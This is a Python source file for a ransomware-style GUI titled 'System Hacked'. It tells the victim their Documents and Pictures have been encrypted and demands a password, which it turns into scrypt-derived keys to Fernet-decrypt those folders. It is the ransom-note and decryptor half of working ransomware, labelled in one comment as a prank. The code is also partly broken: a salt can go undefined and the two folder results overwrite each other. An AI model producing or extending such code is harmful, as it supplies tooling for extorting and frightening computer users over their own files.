# Imports 
import customtkinter
from tkinter import messagebox
from PIL import Image, ImageTk
import os
import pathlib
import secrets
import base64
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
import time

# Main Window 
# Function to center the window
def center_window(app, width, height):
    screen_width = app.winfo_screenwidth()
    screen_height = app.winfo_screenheight()
    x = (screen_width // 2) - (width // 2)
    y = (screen_height // 2) - (height // 2)
    app.geometry(f"{width}x{height}+{x}+{y}")

# Initialize the main window
app = customtkinter.CTk()
app.title("System Hacked")
app.iconbitmap("skull.ico")  # Replace with your .ico file path
window_width = 1000
window_height = 800
center_window(app, window_width, window_height)

# Load the image using PIL and convert it to a format that CTkImage can use
image = Image.open("Warning.jpg")  # Replace with your image file
image = image.resize((800, 500))  # Resize the image (adjust as necessary)
image_ctk = customtkinter.CTkImage(light_image=image, dark_image=image, size=(800, 500))
image_label = customtkinter.CTkLabel(app, text="", image=image_ctk)
image_label.pack(pady=10)  # Add some padding

# Folder decryption method 
def decrypt_folder(foldername, key):
    # If it's a folder, decrypt all the files in it
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            # Skip system files like 'desktop.ini'
            if os.path.basename(child) == 'desktop.ini':
                print(f"Skipping system file: {child}")
                continue

            print(f"[*] Decrypting {child}")
            try:
                # Decrypt the file
                if not decrypt(child, key):
                    return False  # Return False if any file fails to decrypt
            except PermissionError:
                print(f"Permission denied for file: {child}")
            except Exception as e:
                print(f"An error occurred while decrypting {child}: {e}")
                return False  # Return False if an error occurs

        elif child.is_dir():
            print(f"[*] Entering directory {child}")
            # Recursively decrypt files in subfolders
            if not decrypt_folder(child, key):
                return False  # Return False if any folder fails to decrypt

    return True  # Return True if all files are decrypted successfully

# File Decryption Method 
def decrypt(filename, key):
    """Given a filename (str) and key (bytes), it decrypts the file and writes it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        # Display a harmless message
        return False  # Return False to indicate failure
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)
    return True  # Return True to indicate success

# Cryptographic Logic goes here 
def generate_salt(size=16):
    return secrets.token_bytes(size)

def derive_key(salt, password):
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())

def load_salt(Salt_File_Name):
    return open(f"{Salt_File_Name}.salt", "rb").read()

def generate_keyForDocuments(password, salt_size=16, load_existing_salt=False):
    if load_existing_salt:
        Salt_File_Name = "Documents"
        salt = load_salt(Salt_File_Name)
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)

def generate_keyForPictures(password, salt_size=16, load_existing_salt=False):
    if load_existing_salt:
        Salt_File_Name = "Pictures"
        salt = load_salt(Salt_File_Name)
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)

# Function for the "decrypt" button
def unlock_system():
    Password = entry.get()
    keyForDocuments = generate_keyForDocuments(Password, load_existing_salt=True)

    # Initialize a flag to track if decryption was successful
    decryption_success = False

    # Documents Decryption Method
    def Documents_Decryption():
        nonlocal decryption_success
        Documents = os.path.join(os.environ['USERPROFILE'], 'Documents')
        if os.path.isfile(Documents):
            decryption_success = decrypt(Documents, keyForDocuments)  # Update success status
        elif os.path.isdir(Documents):
            decryption_success = decrypt_folder(Documents, keyForDocuments)

    keyForPictures = generate_keyForPictures(Password, load_existing_salt=True)

    # Pictures Decryption Method
    def Pictures_Decryption():
        nonlocal decryption_success
        Pictures = os.path.join(os.environ['USERPROFILE'], 'Pictures')
        if os.path.isfile(Pictures):
            decryption_success = decrypt(Pictures, keyForPictures)  # Update success status
        elif os.path.isdir(Pictures):
            decryption_success = decrypt_folder(Pictures, keyForPictures)

    # Perform the decryption process
    Documents_Decryption()
    time.sleep(2)  # Add a slight delay to simulate decryption time
    Pictures_Decryption()

    # Check if the decryption was successful
    if decryption_success:
        messagebox.showinfo("Decryption Complete", "Your files have been successfully decrypted!")
        app.after(2000, app.quit)  # Close the main window after 2 seconds
    else:
        messagebox.showinfo("Error", "Wrong Password or Corrupted File!")
        entry.delete(0, 'end')  # Clear the password entry field for new input

# Create a label with the prank message
label = customtkinter.CTkLabel(app, text="Your Personal Files & Documents have been encrypted with ransomware\nTo Decrypt it, you must Enter the right password below\nRemember Wrong password can damage your files permanently", text_color="red", font=("Arial", 14), justify="center")
label.pack(pady=20)

# Create an input field for the "password"
entry = customtkinter.CTkEntry(app, placeholder_text="Enter password to unlock", width=250)
entry.pack(pady=10)

# Create a button that "unlocks" the system
button = customtkinter.CTkButton(app, text="Decrypt System", command=unlock_system)
button.pack(pady=10)

# Run the app
app.mainloop()
